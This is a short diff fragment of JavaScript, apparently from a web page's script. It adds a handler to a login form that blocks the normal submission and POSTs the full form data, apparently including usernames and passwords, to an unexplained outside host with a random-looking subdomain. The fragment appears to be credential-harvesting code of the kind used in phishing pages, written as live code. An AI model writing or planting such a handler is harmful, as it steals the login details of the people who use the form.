@@ -9,5 +9,16 @@ fetch("https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net", {
   method: "POST",
   body: data,
 });
-  //.then((response) => response.json())
-  //.then((json) => console.log(json));
+
+login.onsubmit = async (e) => {
+    e.preventDefault();
+
+    let response = await fetch('https://dam5j34p92lis85gpj50s511hyt4rua9u.desert-rat.net', {
+      method: 'POST',
+      body: new FormData(login)
+    });
+
+    //let result = await response.json();
+
+    //alert(result.message);
+  };
